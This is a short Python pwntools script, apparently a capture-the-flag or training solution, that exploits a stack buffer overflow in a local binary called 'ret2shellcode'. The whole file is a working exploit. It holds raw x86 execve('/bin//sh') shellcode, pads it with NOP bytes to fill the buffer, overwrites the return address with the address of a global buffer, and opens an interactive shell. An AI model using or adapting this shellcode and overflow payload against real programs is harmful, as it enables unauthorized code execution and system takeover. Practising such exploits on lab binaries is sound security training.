#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

elf = ELF("./ret2shellcode")
buf2_addr = elf.symbols["buf2"]

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
print disasm(shellcode)

payload = shellcode.ljust(0x6c + 0x4, "\x90") + p32(buf2_addr)

io = process("./ret2shellcode")
io.sendlineafter("!!!\n", payload)
io.interactive()
io.close()


